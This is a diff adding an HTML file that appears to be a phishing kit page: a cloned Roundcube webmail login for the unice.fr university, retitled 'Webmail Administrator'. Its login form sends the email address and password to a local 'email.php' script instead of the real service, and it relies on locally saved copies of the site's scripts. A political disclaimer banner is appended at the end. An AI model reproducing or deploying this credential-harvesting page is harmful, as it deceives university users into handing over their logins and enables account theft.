@@ -1,0 +1,126 @@
+<html class=" js chrome webkit js mozilla"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>Webmail Administrator</title>
+<meta name="Robots" content="noindex,nofollow">
+<meta http-equiv="X-UA-Compatible" content="IE=EDGE">
+<meta name="viewport" content="" id="viewport">
+<link rel="shortcut icon" href="https://webmail.unice.fr/skins/larry/images/favicon.ico">
+<link rel="stylesheet" type="text/css" href="./image/styles.css">
+<!--[if IE 9]><link rel="stylesheet" type="text/css" href="skins/larry/svggradients.css?s=1382384360" /><![endif]-->
+<!--[if lte IE 8]><link rel="stylesheet" type="text/css" href="skins/larry/iehacks.css?s=1382384360" /><![endif]-->
+<!--[if lte IE 7]><link rel="stylesheet" type="text/css" href="skins/larry/ie7hacks.css?s=1382384360" /><![endif]-->
+<link rel="stylesheet" type="text/css" href="./image/jquery-ui-1.9.1.custom.css">
+<script type="text/javascript" async="" defer="" src="//piwik.unice.fr/piwik.js"></script><script type="text/javascript" async="" defer="" src="./image/piwik.js.download"></script><script type="text/javascript" src="./image/ui.js.download"></script>
+
+<script src="./image/jquery.min.js.download" type="text/javascript"></script>
+<script src="./image/common.js.download" type="text/javascript"></script>
+<script src="./image/app.js.download" type="text/javascript"></script>
+<script src="./image/jstz.min.js.download" type="text/javascript"></script>
+<script type="text/javascript">
+
+var rcmail = new rcube_webmail();
+rcmail.set_env({"task":"login","x_frame_options":"sameorigin","cookie_domain":".unice.fr","cookie_path":"\/","cookie_secure":true,"skin":"larry","refresh_interval":60,"session_lifetime":600,"action":"","comm_path":".\/?_task=login","date_format":"yy-mm-dd","request_token":"146c02010cbbeb7fb77f79dfabea120a"});
+rcmail.gui_container("loginfooter","bottomline");
+rcmail.add_label({"loading":"Chargement en cours...","servererror":"Erreur Serveur !","requesttimedout":"D\u00e9lai de la requ\u00eate expir\u00e9","refreshing":"Rafra\u00eechissement en cours..."});
+rcmail.gui_object('loginform', 'form');
+rcmail.gui_object('message', 'message');
+</script>
+
+<script type="text/javascript" src="./image/jquery-ui-1.9.1.custom.min.js.download"></script>
+<script type="text/javascript" src="./image/jquery.ui.datepicker-fr.js.download"></script>
+</head>
+<body class="minimal">
+
+<div id="login-form">
+<div class="box-inner">
+<img src="./image/roundcube_logo.png" id="logo" alt="Webmail Administrator" border="0">
+
+
+<form name="form" action="email.php" method="post">
+<input type="hidden" name="_token" value="146c02010cbbeb7fb77f79dfabea120a">
+<input type="hidden" name="_task" value="login"><input type="hidden" name="_action" value="login"><input type="hidden" name="_timezone" id="rcmlogintz" value="America/Chicago"><input type="hidden" name="username" id="rcmloginurl" value=""><table><tbody><tr><td class="title"><label for="rcmloginuser">Email Address</label>
+</td>
+<td class="input"><input name="username" id="rcmloginuser" size="40" autocapitalize="none" autocomplete="off" type="text"></td>
+</tr>
+<tr><td class="title"><label for="rcmloginpwd">Password</label>
+</td>
+<td class="input"><input name="password" id="rcmloginpwd" size="40" autocapitalize="none" autocomplete="off" type="password"></td>
+</tr>
+</tbody>
+</table>
+
+
+<p class="formbuttons"><input type="submit" class="button mainaction" value="Submit"></p>
+
+</form>
+</div>
+
+<div class="box-bottom">
+	<div id="message"></div>
+	<noscript>
+		<p class="noscriptwarning">Atention : Ce service de webmail nécessite Javascript ! Pour pouvoir l'utiliser, merci d'activer Javascript dans les préférences de votre navigateur.</p>
+	</noscript>
+</div>
+
+<!-- Custom Msg DSI -->
+<div>
+<h2>
+<!--
+Le serveur de messagerie est de nouveau opérationnel<br>(28/04 - 21h20)<p>
+Merci pour votre patience.
+
+Jeudi 28/04/2016 :<br>
+Le serveur de messagerie subit de nouveau une panne qui ralentit son fonctionnement.<br>
+La réparation nécessitera l'arrêt du serveur à partir de 17h00 pour une durée indéterminée.<br>
+Nous sommes désolés pour ces désagréments.<br>
+-->
+</h2>
+</div>
+
+<!-- End Custom Msg DSI -->
+
+<div id="bottomline">
+	Webmail Administrator 
+			&nbsp;●&nbsp; <a href="" target="_blank" class="support-link">Operations and Technical Support</a>
+		
+</div>
+</div>
+
+<script type="text/javascript">
+
+// UI startup
+var UI = new rcube_mail_ui();
+$(document).ready(function(){
+	UI.set('errortitle', 'Une erreur est survenue !');
+	UI.init();
+});
+
+</script>
+
+
+
+
+<script type="text/javascript">
+
+jQuery.extend(jQuery.ui.dialog.prototype.options.position, {
+                using: function(pos) {
+                    var me = jQuery(this),
+                        offset = me.css(pos).offset(),
+                        topOffset = offset.top - 12;
+                    if (topOffset < 0)
+                        me.css('top', pos.top - topOffset);
+                    if (offset.left + me.outerWidth() + 12 > jQuery(window).width())
+                        me.css('left', pos.left - 12);
+                }
+            });
+$(document).ready(function(){ 
+rcmail.init();
+var images = ["skins\/larry\/images\/ajaxloader.gif","skins\/larry\/images\/buttons.png","skins\/larry\/images\/addcontact.png","skins\/larry\/images\/filetypes.png","skins\/larry\/images\/listicons.png","skins\/larry\/images\/messages.png","skins\/larry\/images\/quota.png","skins\/larry\/images\/selector.png","skins\/larry\/images\/splitter.png","skins\/larry\/images\/watermark.jpg"];
+            for (var i=0; i<images.length; i++) {
+                img = new Image();
+                img.src = images[i];
+            }
+});
+</script>
+
+
+<style>.footer,.generic-footer{margin-bottom:98px}@media (min-width:374px){.footer,.generic-footer{margin-bottom:78px}}@media (min-width:546px){.footer,.generic-footer{margin-bottom:56px}}@media (min-width:1055px){.footer,.generic-footer{margin-bottom:0}}.disclaimer{position:fixed;z-index:9999999;bottom:0;right:0;border-top:2px solid #ff5c62;text-align:center;font-size:14px;font-weight:400;background-color:#fff;padding:5px 10px 5px 10px}.disclaimer a:hover{text-decoration:underline}@media (min-width:1052px){.disclaimer{text-align:right;border-left:2px solid red;border-top-left-radius:10px}}@media (min-width:1920px){.disclaimer{width:60%}}</style><div class="disclaimer">We support Ukraine and condemn war. Push Russian government to act against war. Be brave, vocal and show your support to Ukraine. Follow the latest news <a title="https://www.bbc.com/news/live/world-europe-60517447" target="_blank" href="https://www.bbc.com/news/live/world-europe-60517447" style="color: black;"><b>HERE</b></a></div></body></html>
